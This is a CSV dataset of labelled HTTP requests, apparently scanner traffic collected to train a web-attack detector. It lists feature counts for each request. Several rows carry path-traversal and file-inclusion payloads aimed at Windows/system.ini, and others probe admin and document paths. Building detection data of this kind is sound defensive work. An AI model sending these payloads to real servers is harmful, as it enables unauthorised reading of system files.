method,path,body,single_q,double_q,dashes,braces,spaces,percentages,semicolons,angle_brackets,special_chars,path_length,body_length,badwords_count,class
POST,/doLogin,uid=ZAP&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,33,1,1
POST,/sendFeedback,cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,124,0,1
GET,/admin/clients.xls,,0,0,0,0,0,0,0,0,0,18,0,1,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/grouplife.htm,,0,0,0,0,3,0,0,0,0,57,0,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_deposit.htm,,0,0,0,0,3,0,0,0,0,82,0,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal.htm,,0,0,0,0,3,0,0,0,0,74,0,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=personal_checking.htm,,0,0,0,0,3,0,0,0,0,83,0,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/cgi.exe,,0,0,0,0,3,0,0,0,0,51,0,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=inside_press.htm,,0,0,0,0,3,0,0,0,0,78,0,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=inside_careers.htm,,0,0,0,0,3,0,0,0,0,80,0,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/subscribe.jsp,,0,0,0,0,3,0,0,0,0,57,0,0,1
GET,/admin/5426747126540156233,,0,0,0,0,0,0,0,0,0,26,0,1,1
GET,/my%20documents/4334254300613932666.jsp,,0,0,0,0,1,0,0,0,0,37,0,0,1
GET,/my%20documents/JohnSmith/543395271288856021.jsp,,0,0,0,0,1,0,0,0,0,46,0,0,1
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/1982477551809814812.jsp,,0,0,0,0,3,0,0,0,0,67,0,0,1
POST,/doSubscribe,txtEmail=c%3A%2FWindows%2Fsystem.ini&btnSubmit=Subscribe,0,0,0,0,0,0,0,0,0,12,50,1,1
POST,/sendFeedback,cfile=c%3A%2FWindows%2Fsystem.ini&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,133,1,1
POST,/doLogin,uid=c%3A%2FWindows%2Fsystem.ini&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,51,2,1
GET,/Documents/JohnSmith,,0,0,0,0,0,0,0,0,0,20,0,0,1
POST,/sendFeedback,cfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,178,1,1
GET,/Documents/JohnSmith/index.jsp?content=c%3A%5CWindows%5Csystem.ini,,0,0,0,0,0,0,0,0,0,60,0,1,1
POST,/doLogin,uid=c%3A%5CWindows%5Csystem.ini&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,51,2,1
POST,/doSubscribe,txtEmail=c%3A%5CWindows%5Csystem.ini&btnSubmit=Subscribe,0,0,0,0,0,0,0,0,0,12,50,1,1
GET,/Privacypolicy.jsp?sec=c%3A%5CWindows%5Csystem.ini&template=US,,0,0,0,0,0,0,0,0,0,56,0,1,1
GET,/disclaimer.htm?url=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,,0,0,0,0,0,0,0,0,0,86,0,1,1
